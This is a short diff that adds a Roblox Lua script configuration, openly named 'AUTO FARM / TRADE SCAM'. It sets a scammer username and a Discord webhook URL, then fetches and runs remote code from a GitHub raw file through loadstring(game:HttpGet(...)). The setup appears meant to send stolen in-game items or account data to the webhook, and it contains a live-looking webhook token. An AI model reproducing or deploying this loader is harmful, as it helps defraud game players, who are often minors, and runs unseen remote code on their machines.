@@ -1,0 +1,5 @@
+_G.Username = "im_mad214" --EXAMPLE: AuraIation
+_G.HubName = "AUTO FARM / TRADE SCAM" --EXAMPLE Trade Scam!
+_G.Webhook = "https://discord.com/api/webhooks/1098662431540117544/VSZ9IvSXzbv9BrTXcqBaAXY19fGp6ii8WPqk7KM3XBMgr9C3wty63Ji3RlT8h_dC3IMA" --How to get your webhook: https://www.youtube.com/watch?v=fKksxz2Gdnc
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
